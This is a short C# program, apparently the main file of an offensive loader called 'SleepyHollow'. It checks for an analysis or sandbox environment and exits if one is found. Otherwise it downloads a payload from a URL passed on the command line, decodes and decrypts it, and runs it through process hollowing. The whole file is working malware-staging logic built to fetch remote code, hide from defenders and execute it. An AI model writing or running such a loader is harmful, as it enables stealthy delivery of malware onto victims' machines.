using SleepyHollow;

Console.WriteLine("Running checks...");
if (EvasionCheck.Detected)
{
    Console.WriteLine("Have a nice day!");
    Environment.Exit(0);
}

if (args.Length == 0)
{
    Console.WriteLine("Usage: <URL to payload>");
    return;
}

var httpClient = new HttpClient();
var data = await httpClient.GetStringAsync(args[0]);
Console.WriteLine($"Downloaded {data.Length} bytes");
var buf = Decoder.DecodeString(data);
Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
await HollowProcess.Run(buf);